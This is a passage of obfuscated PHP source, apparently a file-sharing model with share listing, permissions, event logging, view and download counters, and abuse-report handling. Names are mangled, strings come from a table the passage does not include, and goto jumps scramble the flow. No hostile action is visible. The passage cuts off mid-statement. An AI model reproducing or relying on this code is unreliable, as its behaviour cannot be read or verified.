$BğöÙ¢²Ÿâ[1012]) { $Dñ°´×‰áŒ = array($BğöÙ¢²Ÿâ[448] => 1); } } $Dñ°´×‰áŒ[$BğöÙ¢²Ÿâ[1445]] = USER_ID; $E‹Å‹¯·¿ = $this->where($Dñ°´×‰áŒ)->selectPage($D¦Ù–Êˆ½Œ); return $E‹Å‹¯·¿; } protected function listToMe($e³äëŞ†ÏÌ = 300) { goto FÁ™ğ´Œ„œ; E¸ÕŠÜÄí: $EÉô’äõ„ = array($F¿Ñ»Ø†‰¶[441] => array($F¿Ñ»Ø†‰¶[384], array_keys($Fà¾è«Á¿))); $E©•¼Ï…ùÌ = $this->field($bíŸÎµ¹Ñ)->where($EÉô’äõ„)->select(); foreach ($E©•¼Ï…ùÌ as $cêĞô»²Õ¡ => &$a†Ğ÷ø…­) { $a†Ğ÷ø…­[$F¿Ñ»Ø†‰¶[2226]] = $Fà¾è«Á¿[$a†Ğ÷ø…­[$F¿Ñ»Ø†‰¶[441]]]; } goto A‹õîêõÍ; BÃÎ‚Ä¼Ô: $EÉô’äõ„ = array($F¿Ñ»Ø†‰¶[521] => SourceModel::TYPE_USER, $F¿Ñ»Ø†‰¶[456] => USER_ID); if ($D”Üí »ğõ) { $EÉô’äõ„ = array(array($F¿Ñ»Ø†‰¶[521] => SourceModel::TYPE_USER, $F¿Ñ»Ø†‰¶[456] => USER_ID), array($F¿Ñ»Ø†‰¶[521] => SourceModel::TYPE_GROUP, $F¿Ñ»Ø†‰¶[456] => array($F¿Ñ»Ø†‰¶[7], $D”Üí »ğõ)), $F¿Ñ»Ø†‰¶[2227] => $F¿Ñ»Ø†‰¶[2195]); } $a×©‘Û­²ã = Model($F¿Ñ»Ø†‰¶[537])->where($EÉô’äõ„)->selectPage($e³äëŞ†ÏÌ); goto eÍ“‰ÊÜõ; eÍ“‰ÊÜõ: $Fà¾è«Á¿ = array_to_keyvalue_group($a×©‘Û­²ã[$F¿Ñ»Ø†‰¶[354]], $F¿Ñ»Ø†‰¶[441]); if (!$Fà¾è«Á¿) { return $a×©‘Û­²ã; } $bíŸÎµ¹Ñ = $F¿Ñ»Ø†‰¶[2229]; goto E¸ÕŠÜÄí; FÁ™ğ´Œ„œ: $F¿Ñ»Ø†‰¶ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EĞÈÇÈ»› = Session::get($F¿Ñ»Ø†‰¶[2228]); $D”Üí »ğõ = array_to_keyvalue($EĞÈÇÈ»›, $F¿Ñ»Ø†‰¶[33], $F¿Ñ»Ø†‰¶[2113]); goto BÃÎ‚Ä¼Ô; A‹õîêõÍ: $aĞŒ¸…Œ  = array($F¿Ñ»Ø†‰¶[2230] => $E©•¼Ï…ùÌ, $F¿Ñ»Ø†‰¶[2231] => $a×©‘Û­²ã[$F¿Ñ»Ø†‰¶[351]]); return $aĞŒ¸…Œ ; goto cÈÛ¼˜Âœñ; cÈÛ¼˜Âœñ: } protected function shareAdd($cŸ…‹¤ƒ¾ì, $BŸÖÎÕÌ·¨) { $C“¯³ê”Š¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C‹êÇ´®·‰ = $this->_addShareData($cŸ…‹¤ƒ¾ì, $BŸÖÎÕÌ·¨); if (!empty($BŸÖÎÕÌ·¨[$C“¯³ê”Š¡[2232]])) { $this->_shareAuthSet($C‹êÇ´®·‰, $BŸÖÎÕÌ·¨[$C“¯³ê”Š¡[2232]]); } $this->shareEventAdd($cŸ…‹¤ƒ¾ì, $BŸÖÎÕÌ·¨, $C“¯³ê”Š¡[1015]); return $C‹êÇ´®·‰; } private function shareEventAdd($Cï”‚½°ÌŠ, $cÑùö¿‰², $BºÖ‚œĞ = "\141\x64\x64") { goto EªÌÛæ¢„Ê; DÚŞµÍà¿ö: $A‹†ôğÎ„ = $fĞº™Ä°Æ[2235]; if ($Fä¹›Ø·‡¢[$fĞº™Ä°Æ[446]] == $fĞº™Ä°Æ[468] && $cÑùö¿‰²[$fĞº™Ä°Æ[446]] == $fĞº™Ä°Æ[83]) { $A‹†ôğÎ„ = $fĞº™Ä°Æ[2233]; } if ($Fä¹›Ø·‡¢[$fĞº™Ä°Æ[446]] == $fĞº™Ä°Æ[83] && $cÑùö¿‰²[$fĞº™Ä°Æ[446]] == $fĞº™Ä°Æ[468]) { $A‹†ôğÎ„ = $fĞº™Ä°Æ[2236]; } goto BõÂóô¶ãÆ; BõÂóô¶ãÆ: if ($Fä¹›Ø·‡¢[$fĞº™Ä°Æ[448]] == $fĞº™Ä°Æ[468] && $cÑùö¿‰²[$fĞº™Ä°Æ[448]] == $fĞº™Ä°Æ[83]) { $A‹†ôğÎ„ = $fĞº™Ä°Æ[2234]; } if ($Fä¹›Ø·‡¢[$fĞº™Ä°Æ[448]] == $fĞº™Ä°Æ[83] && $cÑùö¿‰²[$fĞº™Ä°Æ[448]] == $fĞº™Ä°Æ[468]) { $A‹†ôğÎ„ = $fĞº™Ä°Æ[2237]; } Model($fĞº™Ä°Æ[505])->eventShare($Cï”‚½°ÌŠ, $A‹†ôğÎ„); goto D‘ä¼¿åÅ‡; EªÌÛæ¢„Ê: $fĞº™Ä°Æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($BºÖ‚œĞ == $fĞº™Ä°Æ[1015]) { if ($cÑùö¿‰²[$fĞº™Ä°Æ[446]] == $fĞº™Ä°Æ[83]) { Model($fĞº™Ä°Æ[505])->eventShare($Cï”‚½°ÌŠ, $fĞº™Ä°Æ[2233]); } if ($cÑùö¿‰²[$fĞº™Ä°Æ[448]] == $fĞº™Ä°Æ[83]) { Model($fĞº™Ä°Æ[505])->eventShare($Cï”‚½°ÌŠ, $fĞº™Ä°Æ[2234]); } return; } $Fä¹›Ø·‡¢ = $this->getInfoByPath($Cï”‚½°ÌŠ); goto DÚŞµÍà¿ö; D‘ä¼¿åÅ‡: return; goto C‰Õç‡ÏÚ; C‰Õç‡ÏÚ: } private function _addShareData($eÚ«¹–Ï×Ë, $A‡õÀˆ¶æ¥ = array()) { goto EÖ—í­‚²; EÖ—í­‚²: $Cä–ŸÙö‡ª =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dˆÀòÑ´±é = array($Cä–ŸÙö‡ª[383] => $eÚ«¹–Ï×Ë, $Cä–ŸÙö‡ª[1436] => USER_ID); if ($eÚ«¹–Ï×Ë == 0) { $dˆÀòÑ´±é = array($Cä–ŸÙö‡ª[2238] => $A‡õÀˆ¶æ¥[$Cä–ŸÙö‡ª[1023]], $Cä–ŸÙö‡ª[1436] => USER_ID); } goto d½à³É­ğø; f•Î˜ëö: $a–«ŠĞ•èé = array($Cä–ŸÙö‡ª[1436] => USER_ID, $Cä–ŸÙö‡ª[383] => $eÚ«¹–Ï×Ë, $Cä–ŸÙö‡ª[1351] => $Cä–ŸÙö‡ª[33], $Cä–ŸÙö‡ª[446] => 0, $Cä–ŸÙö‡ª[448] => 0, $Cä–ŸÙö‡ª[1023] => $Cä–ŸÙö‡ª[33], $Cä–ŸÙö‡ª[295] => $Cä–ŸÙö‡ª[33], $Cä–ŸÙö‡ª[806] => $Cä–ŸÙö‡ª[33], $Cä–ŸÙö‡ª[2239] => 0, $Cä–ŸÙö‡ª[2240] => 0, $Cä–ŸÙö‡ª[706] => 0, $Cä–ŸÙö‡ª[2241] => $Cä–ŸÙö‡ª[33], $Cä–ŸÙö‡ª[443] => $Cä–ŸÙö‡ª[33]); $FÕØ¿¼ÑÎÏ = explode($Cä–ŸÙö‡ª[47], $Cä–ŸÙö‡ª[2242]); foreach ($FÕØ¿¼ÑÎÏ as $EŞÚ¨ëä«) { if (!isset($A‡õÀˆ¶æ¥[$EŞÚ¨ëä«])) { continue; } $a–«ŠĞ•èé[$EŞÚ¨ëä«] = $A‡õÀˆ¶æ¥[$EŞÚ¨ëä«]; } goto f°¢Ş÷Óª”; EªÏù‰•Âù: return $Cù•ñ†«Ğ; goto c˜›ÜÛ½à¬; d½à³É­ğø: if ($e²–ííß™Ÿ = $this->where($dˆÀòÑ´±é)->find()) { return $e²–ííß™Ÿ[$Cä–ŸÙö‡ª[441]]; } if ($eÚ«¹–Ï×Ë == 0) { $f¦Ûöñ† = array($Cä–ŸÙö‡ª[28] => get_path_this($A‡õÀˆ¶æ¥[$Cä–ŸÙö‡ª[75]])); } else { $f¦Ûöñ† = Model($Cä–ŸÙö‡ª[756])->sourceInfo($eÚ«¹–Ï×Ë); if (!$f¦Ûöñ†) { return !1; } } if (!$A‡õÀˆ¶æ¥[$Cä–ŸÙö‡ª[1351]]) { $A‡õÀˆ¶æ¥[$Cä–ŸÙö‡ª[1351]] = $f¦Ûöñ†[$Cä–ŸÙö‡ª[28]]; } goto f•Î˜ëö; f°¢Ş÷Óª”: $Cù•ñ†«Ğ = $this->add($a–«ŠĞ•èé); $EÏŞƒ£¶­ª = array($Cä–ŸÙö‡ª[443] => short_id($Cù•ñ†«Ğ)); $this->where(array($Cä–ŸÙö‡ª[440] => $Cù•ñ†«Ğ))->save($EÏŞƒ£¶­ª); goto EªÏù‰•Âù; c˜›ÜÛ½à¬: } private function _shareAuthSet($Bå‹¿÷öÃ¼, $C ç®‹’•«) { goto Câˆ¹¸åø; Câˆ¹¸åø: $F˜ò¡•ğ»ª =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!is_array($C ç®‹’•«)) { return !1; } $eì†¾é«ô¥ = Model($F˜ò¡•ğ»ª[2243]); goto D—Ÿø¿³Ğ; D—Ÿø¿³Ğ: $eì†¾é«ô¥->where(array($F˜ò¡•ğ»ª[441] => $Bå‹¿÷öÃ¼))->delete(); $A‹Ö›ó™Éì = array(); foreach ($C ç®‹’•« as $aÚõîƒïÇ„) { $BŸÑÅ¼¾£š = SourceModel::TYPE_USER; if ($aÚõîƒïÇ„[$F˜ò¡•ğ»ª[371]] == SourceModel::TYPE_GROUP) { $BŸÑÅ¼¾£š = SourceModel::TYPE_GROUP; } $aß‡‡áŸ­ó = array($F˜ò¡•ğ»ª[441] => $Bå‹¿÷öÃ¼, $F˜ò¡•ğ»ª[371] => $BŸÑÅ¼¾£š, $F˜ò¡•ğ»ª[456] => intval($aÚõîƒïÇ„[$F˜ò¡•ğ»ª[456]]), $F˜ò¡•ğ»ª[2244] => 0, $F˜ò¡•ğ»ª[2245] => -1); if ($aÚõîƒïÇ„[$F˜ò¡•ğ»ª[2244]]) { $aß‡‡áŸ­ó[$F˜ò¡•ğ»ª[2244]] = $aÚõîƒïÇ„[$F˜ò¡•ğ»ª[2244]]; } else { if ($aÚõîƒïÇ„[$F˜ò¡•ğ»ª[2245]]) { $aß‡‡áŸ­ó[$F˜ò¡•ğ»ª[2245]] = $aÚõîƒïÇ„[$F˜ò¡•ğ»ª[2245]]; } } $A‹Ö›ó™Éì[] = $aß‡‡áŸ­ó; } goto bÕÊÈ’«›; bÕÊÈ’«›: return $eì†¾é«ô¥->addAll($A‹Ö›ó™Éì, array(), !0); goto eõ›¾¹àÁò; eõ›¾¹àÁò: } public function numViewAdd($c÷¬¦¬Ø»Ó) { $A¾ÄÈßÂƒÔ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F¤é°Æİ = array($A¾ÄÈßÂƒÔ[440] => $c÷¬¦¬Ø»Ó); $this->where($F¤é°Æİ)->setAdd($A¾ÄÈßÂƒÔ[2239]); } public function numDownloadAdd($eèƒ¢½›—) { $d•ŠíÑŒÀ” =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e¥•ìğÉÚ = array($d•ŠíÑŒÀ”[440] => $eèƒ¢½›—); $this->where($e¥•ìğÉÚ)->setAdd($d•ŠíÑŒÀ”[2240]); } protected function shareEdit($B¿äˆÉ‡òº, $FÒ¬¨Íé¥‡) { goto e¡ŠˆÍÄâ³; F¼Å‡Éğ“Ì: $this->_checkLinkShare($FÒ¬¨Íé¥‡, $fµö¥ÁÊ); $eçğ…¾¸à = array(); $Bù°Œ÷«è = explode($F´çÂà®[47], $F´çÂà®[2246]); goto CÊ¡’ÚÌ‚; e¡ŠˆÍÄâ³: $F´çÂà® =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fµö¥ÁÊ = $this->getInfo($B¿äˆÉ‡òº); if (!$fµö¥ÁÊ) { return !1; } goto F¼Å‡Éğ“Ì; dö©ï˜‚À«: if (isset($FÒ¬¨Íé¥‡[$F´çÂà®[2232]])) { $this->_shareAuthSet($B¿äˆÉ‡òº, $FÒ¬¨Íé¥‡[$F´çÂà®[2232]]); } return !0; goto fÜŒĞâÕ Ñ; CÊ¡’ÚÌ‚: foreach ($Bù°Œ÷«è as $cÊ–Õ÷æ§Ô) { if (!array_key_exists($cÊ–Õ÷æ§Ô, $FÒ¬¨Íé¥‡)) { continue; } $eçğ…¾¸à[$cÊ–Õ÷æ§Ô] = $FÒ¬¨Íé¥‡[$cÊ–Õ÷æ§Ô]; } $this->shareEventAdd($fµö¥ÁÊ[$F´çÂà®[369]], $FÒ¬¨Íé¥‡, $F´çÂà®[2080]); $this->where(array($F´çÂà®[440] => $B¿äˆÉ‡òº))->save($eçğ…¾¸à); goto dö©ï˜‚À«; fÜŒĞâÕ Ñ: } private function _checkLinkShare($b‡é‚Å¢ÙÃ, $aõøÛ…°ã‰) { goto DŒ¬æ¥—¾·; CØèñÒ…Ã: if ($aõøÛ…°ã‰[$f¡ßœâä‹ô[391]][$f¡ßœâä‹ô[29]] != $f¡ßœâä‹ô[167]) { $e†òÉÄåâÄ = $this->_folderReport($C†÷é˜¨ô); if (!$e†òÉÄåâÄ) { return; } show_json(LNG($f¡ßœâä‹ô[2247]) . $f¡ßœâä‹ô[2248] . $e†òÉÄåâÄ, !1); } $AÈ«•‡÷Ñ = Model($f¡ßœâä‹ô[756])->fileInfoGet($aõøÛ…°ã‰[$f¡ßœâä‹ô[391]][$f¡ßœâä‹ô[369]]); if (!$AÈ«•‡÷Ñ) { return; } goto DÌÜ›‡Š; DŒ¬æ¥—¾·: $f¡ßœâä‹ô =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($b‡é‚Å¢ÙÃ[$f¡ßœâä‹ô[446]] != $f¡ßœâä‹ô[83]) { return; } $C†÷é˜¨ô = $aõøÛ…°ã‰[$f¡ßœâä‹ô[391]][$f¡ßœâä‹ô[369]]; goto CØèñÒ…Ã; DÌÜ›‡Š: $d¥Ñåß‹Ğğ = $this->shareFileMeta($AÈ«•‡÷Ñ[$f¡ßœâä‹ô[419]]); if (isset($d¥Ñåß‹Ğğ[$f¡ßœâä‹ô[359]]) && $d¥Ñåß‹Ğğ[$f¡ßœâä‹ô[359]] == $f¡ßœâä‹ô[83]) { show_json(LNG($f¡ßœâä‹ô[2249]), !1); } goto b­«ßê Õ; b­«ßê Õ: } private function _folderReport($bÇ¤ĞÔ—¢) { goto cØŸê•ß»¶; cØŸê•ß»¶: $cğ´ƒ¼‹Şá =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bî¯º§¿Æ‡ = array($cğ´ƒ¼‹Şá[419] => array($cğ´ƒ¼‹Şá[930], 0), $cğ´ƒ¼‹Şá[692] => 3); $AŒÕ§šĞ‡Õ = Model($cğ´ƒ¼‹Şá[2250])->where($bî¯º§¿Æ‡)->field($cğ´ƒ¼‹Şá[419])->select(); goto Eºµİ™¾†; F½­àÂ÷§§: $bî¯º§¿Æ‡ = array($cğ´ƒ¼‹Şá[419] => array($cğ´ƒ¼‹Şá[7], $AŒÕ§šĞ‡Õ), $cğ´ƒ¼‹Şá[459] => array($cğ´ƒ¼‹Şá[755], "\x25{$Bñ¶Âº¯×…}\x25"), $cğ´ƒ¼‹Şá[397] => 0); $a–öøŸÉ»ë = Model($cğ´ƒ¼‹Şá[756])->where($bî¯º§¿Æ‡)->field($cğ´ƒ¼‹Şá[2251])->find(); if (!$a–öøŸÉ»ë) { return !1; } goto E¨Şé¹Ã¤; Eºµİ™¾†: if (!$AŒÕ§šĞ‡Õ) { return !1; } $AŒÕ§šĞ‡Õ = array_to_keyvalue($AŒÕ§šĞ‡Õ, $cğ´ƒ¼‹Şá[33], $cğ´ƒ¼‹Şá[419]); $Bñ¶Âº¯×… = $cğ´ƒ¼‹Şá[47] . $bÇ¤ĞÔ—¢ . $cğ´ƒ¼‹Şá[47]; goto F½­àÂ÷§§; E¨Şé¹Ã¤: $BåøìñƒŸË = substr($a–öøŸÉ»ë[$cğ´ƒ¼‹Şá[459]], strpos($a–öøŸÉ»ë[$cğ´ƒ¼‹Şá[459]], $Bñ¶Âº¯×…)); $bî¯º§¿Æ‡ = array($cğ´ƒ¼‹Şá[369] => array($cğ´ƒ¼‹Şá[7], trim($BåøìñƒŸË, $cğ´ƒ¼‹Şá[47]))); $b¸öî¥İ™‚ = Model($cğ´ƒ¼‹Şá[756])->where($bî¯º§¿Æ‡)->field($cğ´ƒ¼‹Şá[28])->select(); goto A‰ô§½ÄŸ°; A‰ô§½ÄŸ°: $B’¼»¦ƒ”É = array_to_keyvalue($b¸öî¥İ™‚, $cğ´ƒ¼‹Şá[33], $cğ´ƒ¼‹Şá[28]); $B’¼»¦ƒ”É[] = $a–öøŸÉ»ë[$cğ´ƒ¼‹Şá[28]]; return implode($cğ´ƒ¼‹Şá[8], $B’¼»¦ƒ”É); goto f–ÎÓÖµ‹; f–ÎÓÖµ‹: } protected function remove($Eï¼Äè³ëò) { goto AÌø´˜¤‚; A‹¾ãçæØ: $C¿©òŒ¨íî = $this->where($bÈÈë•× ÷)->delete(); if ($C¿©òŒ¨íî) { Model($bİµğÍ‚Ë±[537])->where(array($bİµğÍ‚Ë±[441] => $Eï¼Äè³ëò))->delete(); } $D‚ŠÎ—ğ‡ = is_array($Eï¼Äè³ëò) ? $Eï¼Äè³ëò[1] : array($Eï¼Äè³ëò); goto c°ê‡¤÷»§; AÌø´˜¤‚: $bİµğÍ‚Ë± =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_array($Eï¼Äè³ëò)) { $Eï¼Äè³ëò = array($bİµğÍ‚Ë±[7], $Eï¼Äè³ëò); } $bÈÈë•× ÷ = array($bİµğÍ‚Ë±[441] => $Eï¼Äè³ëò); goto A‹¾ãçæØ; c°ê‡¤÷»§: for ($F‡„Ìà¹İ‰ = 0; $F‡„Ìà¹İ‰ < count($D‚ŠÎ—ğ‡); $F‡„Ìà¹İ‰++) { $f‡İ†¾µ = $this->getInfo($D‚ŠÎ—ğ‡[$F‡„Ìà¹İ‰]); if ($f‡İ†¾µ[$bİµğÍ‚Ë±[448]] == $bİµğÍ‚Ë±[83]) { Model($bİµğÍ‚Ë±[505])->eventShare($f‡İ†¾µ[$bİµğÍ‚Ë±[369]], $bİµğÍ‚Ë±[2237]); } if ($f‡İ†¾µ[$bİµğÍ‚Ë±[446]] == $bİµğÍ‚Ë±[83]) { Model($bİµğÍ‚Ë±[505])->eventShare($f‡İ†¾µ[$bİµğÍ‚Ë±[369]], $bİµğÍ‚Ë±[2236]); } } return $C¿©òŒ¨íî; goto C™¶›¦Ø; C™¶›¦Ø: } protected function removeBySource($fÂ³íÃ‡®¶) { goto AËÌâùÑÌê; AËÌâùÑÌê: $D‹ÉË‡˜– =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C‰åÓÊ¬Ï = array($D‹ÉË‡˜–[383] => array($D‹ÉË‡˜–[384], $fÂ³íÃ‡®¶)); $A‹˜¢¾çÎó = $this->field($D‹ÉË‡˜–[441])->where($C‰åÓÊ¬Ï)->select(); goto bÊŠóŠ®Š¥; böğ–Òâ”¹: $this->where($C‰åÓÊ¬Ï)->delete(); Model($D‹ÉË‡˜–[537])->where($C‰åÓÊ¬Ï)->delete(); goto b­‹¾Éë‘Ç; bÊŠóŠ®Š¥: $A‹˜¢¾çÎó = array_to_keyvalue($A‹˜¢¾çÎó, $D‹ÉË‡˜–[33], $D‹ÉË‡˜–[441]); if (!$A‹˜¢¾çÎó) { return; } $C‰åÓÊ¬Ï = array($D‹ÉË‡˜–[440] => array($D‹ÉË‡˜–[384], $A‹˜¢¾çÎó)); goto böğ–Òâ”¹; b­‹¾Éë‘Ç: } public function listAll($FŠ±Ü¯ìæé) { goto cĞÇ³é˜¹Å; B èéŸõÛ: $b¦¾ƒğö­Ì = $this->_makeOrder()->where($FİáÏÅÍÀì)->selectPage(20); if (empty($b¦¾ƒğö­Ì[$EÍï§òóë[354]])) { return array(); } $this->_listDataApply($b¦¾ƒğö­Ì[$EÍï§òóë[354]]); goto bˆÈâĞîŠØ; eÈîà¾³ØÓ: if ($FŠ±Ü¯ìæé[$EÍï§òóë[705]]) { $A¨èÑ‹è÷ = $FŠ±Ü¯ìæé[$EÍï§òóë[706]] ? $FŠ±Ü¯ìæé[$EÍï§òóë[706]] : strtotime(date($EÍï§òóë[2252])); $FİáÏÅÍÀì[$EÍï§òóë[187]] = array($EÍï§òóë[321], array($FŠ±Ü¯ìæé[$EÍï§òóë[705]], $A¨èÑ‹è÷)); } if ($FŠ±Ü¯ìæé[$EÍï§òóë[29]]) { $FİáÏÅÍÀì[$FŠ±Ü¯ìæé[$EÍï§òóë[29]]] = 1; } else { $FİáÏÅÍÀì[] = array($EÍï§òóë[446] => array($EÍï§òóë[930], 0), $EÍï§òóë[448] => array($EÍï§òóë[930], 0), $EÍï§òóë[2227] => $EÍï§òóë[2195]); } if ($FŠ±Ü¯ìæé[$EÍï§òóë[2191]]) { $FİáÏÅÍÀì[] = array($EÍï§òóë[443] => $FŠ±Ü¯ìæé[$EÍï§òóë[2191]], $EÍï§òóë[1351] => array($EÍï§òóë[755], "\45{$FŠ±Ü¯ìæé[$EÍï§òóë[2191]]}\x25"), $EÍï§òóë[2227] => $EÍï§òóë[2195]); } goto B èéŸõÛ; cĞÇ³é˜¹Å: $EÍï§òóë =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FİáÏÅÍÀì = array(); if ($FŠ±Ü¯ìæé[$EÍï§òóë[1445]]) { $FİáÏÅÍÀì[$EÍï§òóë[1445]] = $FŠ±Ü¯ìæé[$EÍï§òóë[1445]]; } goto eÈîà¾³ØÓ; bˆÈâĞîŠØ: return $b¦¾ƒğö­Ì; goto DÊÀ­Šùİ©; DÊÀ­Šùİ©: } public function listDataApply($c¿ÓŠ“‡’) { $this->_listDataApply($c¿ÓŠ“‡’); return $c¿ÓŠ“‡’; } private function _listDataApply(&$A’×ÌÎ«š) { $bªÑªÒùëš =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÁ‚ŒˆÉÍ = array_to_keyvalue($A’×ÌÎ«š, $bªÑªÒùëš[33], $bªÑªÒùëš[1445]); $F ˆİ¿·é = Model($bªÑªÒùëš[477])->userListInfo(array_unique($AÁ‚ŒˆÉÍ)); $FŸˆŒ¸ˆ = array_to_keyvalue($A’×ÌÎ«š, $bªÑªÒùëš[33], $bªÑªÒùëš[369]); $Fòõ‹‰†ñ = Model($bªÑªÒùëš[756])->sourceListInfo($FŸˆŒ¸ˆ, !0); foreach ($A’×ÌÎ«š as &$aæïøİÙ–) { $b¬Ş‡ÏŠ„® = $aæïøİÙ–[$bªÑªÒùëš[1445]]; $aæïøİÙ–[$bªÑªÒùëš[2253]] = $F ˆİ¿·é[$b¬Ş‡ÏŠ„®] ? $F ˆİ¿·é[$b¬Ş‡ÏŠ„®] : !1; $Cí¶¾‚Œ‹× = $aæïøİÙ–[$bªÑªÒùëš[369]]; $aæïøİÙ–[$bªÑªÒùëš[391]] = $Fòõ‹‰†ñ[$Cí¶¾‚Œ‹×] ? $Fòõ‹‰†ñ[$Cí¶¾‚Œ‹×] : !1; } } private function _makeOrder($a‘ÎÀå»¡Û = '') { goto DÔ™©¯ƒç¦; fä±©ŞËß˜: $Cõ”¨½¿‰© = Input::get($A›Œèéìç[407], $A›Œèéìç[7], $A›Œèéìç[389], $aÏ„æç¨Å‘); $C’¡ÚœÌÙ = Input::get($A›Œèéìç[408], $A›Œèéìç[7], $A›Œèéìç[2254], array($A›Œèéìç[2190], $A›Œèéìç[404])); $C’¡ÚœÌÙ = $EÑºÔ‰–Ùº[$C’¡ÚœÌÙ]; goto Dæ¹¼Ï×Ï; DÔ™©¯ƒç¦: $A›Œèéìç =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÏ„æç¨Å‘ = array($A›Œèéìç[187], $A›Œèéìç[706], $A›Œèéìç[2239], $A›Œèéìç[2240]); $EÑºÔ‰–Ùº = array($A›Œèéìç[402] => $A›Œèéìç[403], $A›Œèéìç[404] => $A›Œèéìç[405]); goto fä±©ŞËß˜; Dæ¹¼Ï×Ï: $a‘ÎÀå»¡Û = $a‘ÎÀå»¡Û . "{$Cõ”¨½¿‰©}\40{$C’¡ÚœÌÙ}"; return $this->order($a‘ÎÀå»¡Û); goto bÔÕ˜æØÃÄ; bÔÕ˜æØÃÄ: } public function reportAdd($BÎ¾ö¨¤Ú‡) { $Fùªë¹¤³¶ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b†…¤ï°Ç¡ = array($Fùªë¹¤³¶[441] => $BÎ¾ö¨¤Ú‡[$Fùªë¹¤³¶[441]], $Fùªë¹¤³¶[1445] => USER_ID); if (Model($Fùªë¹¤³¶[2250])->where($b†…¤ï°Ç¡)->find()) { return !1; } $B¸åšóòÊ„ = array($Fùªë¹¤³¶[441] => $BÎ¾ö¨¤Ú‡[$Fùªë¹¤³¶[441]], $Fùªë¹¤³¶[1351] => $BÎ¾ö¨¤Ú‡[$Fùªë¹¤³¶[1351]], $Fùªë¹¤³¶[369] => $BÎ¾ö¨¤Ú‡[$Fùªë¹¤³¶[369]], $Fùªë¹¤³¶[419] => $BÎ¾ö¨¤Ú‡[$Fùªë¹¤³¶[419]], $Fùªë¹¤³¶[1445] => USER_ID, $Fùªë¹¤³¶[29] => $BÎ¾ö¨¤Ú‡[$Fùªë¹¤³¶[29]], $Fùªë¹¤³¶[405] => $BÎ¾ö¨¤Ú‡[$Fùªë¹¤³¶[405]]); return Model($Fùªë¹¤³¶[2250])->add($B¸åšóòÊ„); } public function reportList($dµç¢¡ÄÁ) { goto d°»…ŠÃÜ; c£ÅêÈà: $dÃ»×£Œ’¥ = array($eÀ–¾¼ñòŒ[402] => $eÀ–¾¼ñòŒ[403], $eÀ–¾¼ñòŒ[404] => $eÀ–¾¼ñòŒ[405]); $C„ãÍÒ™Õó = $eÀ–¾¼ñòŒ[2258] . $dÃ»×£Œ’¥[$A¿µ£éï•ç]; $AÕ“™ĞØŒá = Model($eÀ–¾¼ñòŒ[2250])->where($FÙÎÙ©¿µ²)->order($C„ãÍÒ™Õó)->selectPage(20); goto eÉ¯–¤Ùë; F¥”Ü¤µÊï: if (isset($dµç¢¡ÄÁ[$eÀ–¾¼ñòŒ[29]]) && in_array($dµç¢¡ÄÁ[$eÀ–¾¼ñòŒ[29]], array($eÀ–¾¼ñòŒ[83], $eÀ–¾¼ñòŒ[2255], $eÀ–¾¼ñòŒ[2256], $eÀ–¾¼ñòŒ[2257], $eÀ–¾¼ñòŒ[1928]))) { $FÙÎÙ©¿µ²[$eÀ–¾¼ñòŒ[29]] = $dµç¢¡ÄÁ[$eÀ–¾¼ñòŒ[29]]; } if (isset($dµç¢¡ÄÁ[$eÀ–¾¼ñòŒ[692]]) && in_array($dµç¢¡ÄÁ[$eÀ–¾¼ñòŒ[692]], array($eÀ–¾¼ñòŒ[468], $eÀ–¾¼ñòŒ[83], $eÀ–¾¼ñòŒ[2255], $eÀ–¾¼ñòŒ[2256]))) { $FÙÎÙ©¿µ²[$eÀ–¾¼ñòŒ[692]] = $dµç¢¡ÄÁ[$eÀ–¾¼ñòŒ[692]]; } $A¿µ£éï•ç = Input::get($eÀ–¾¼ñòŒ[408], $eÀ–¾¼ñòŒ[7], $eÀ–¾¼ñòŒ[2254], array($eÀ–¾¼ñòŒ[2190], $eÀ–¾¼ñòŒ[404])); goto c£ÅêÈà; d°»…ŠÃÜ: $eÀ–¾¼ñòŒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÙÎÙ©¿µ² = array(); if ($dµç¢¡ÄÁ[$eÀ–¾¼ñòŒ[705]]) { $f×ä¢ï½î = $dµç¢¡ÄÁ[$eÀ–¾¼ñòŒ[706]] ? $dµç¢¡ÄÁ[$eÀ–¾¼ñòŒ[706]] : strtotime(date($eÀ–¾¼ñòŒ[2252])); $FÙÎÙ©¿µ²[$eÀ–¾¼ñòŒ[187]] = array($eÀ–¾¼ñòŒ[321], array($dµç¢¡ÄÁ[$eÀ–¾¼ñòŒ[705]], $f×ä¢ï½î)); } goto F¥”Ü¤µÊï; eÉ¯–¤Ùë: if (empty($AÕ“™ĞØŒá[$eÀ–¾¼ñòŒ[354]])) { return array(); } $this->_listDataApply($AÕ“™ĞØŒá[$eÀ–¾¼ñòŒ[354]]); return $AÕ“™ĞØŒá; goto dÚÆÔø¨–; dÚÆÔø¨–: } public function reportStatus($cˆ™–¢İã›) { goto dõ¥‹ÌÉßá; c‚¡ÕÂÁø: if (!$E‘‡ÇÕ á‹) { return !1; } $f•Şˆïİä¾ = array($eÄÃ³›Äïš[692] => $cˆ™–¢İã›[$eÄÃ³›Äïš[692]]); if ($cˆ™–¢İã›[$eÄÃ³›Äïš[692]] == $eÄÃ³›Äïš[2256] && $E‘‡ÇÕ á‹[$eÄÃ³›Äïš[692]] == $eÄÃ³›Äïš[2256]) { $f•Şˆïİä¾[$eÄÃ³›Äïš[692]] = 0; } goto Bº´À«å·¹; Bº´À«å·¹: $FâÁ¦†Ï’Ì = Model($eÄÃ³›Äïš[2250])->where($D‡˜…†ÅÑÕ)->save($f•Şˆïİä¾); if ($cˆ™–¢İã›[$eÄÃ³›Äïš[692]] == $eÄÃ³›Äïš[2255]) { if ($E‘‡ÇÕ á‹[$eÄÃ³›Äïš[419]] != $eÄÃ³›Äïš[468] && $this->shareFileMeta($E‘‡ÇÕ 